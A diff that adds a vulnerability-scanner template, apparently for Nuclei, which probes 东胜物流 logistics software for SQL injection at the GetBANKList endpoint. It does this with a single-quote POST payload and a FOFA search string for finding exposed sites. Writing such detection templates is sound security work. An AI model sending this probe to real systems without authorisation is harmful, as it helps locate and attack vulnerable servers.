@@ -1,0 +1,30 @@
+id: DongSheng-GetBANKList-SQL
+
+info:
+  name: 东胜物流 GetBANKList SQL注入
+  author: proud
+  severity: high
+  description: fofa:body="dhtmlxcombo_whp.js"
+  tags: SQL
+
+http:
+  - raw:
+      - |-
+        POST /MvcShipping/MsBaseInfo/GetBANKList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Length: 15
+
+        strCondition=1'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '  "Success": true'
+      - type: status
+        status:
+          - 200
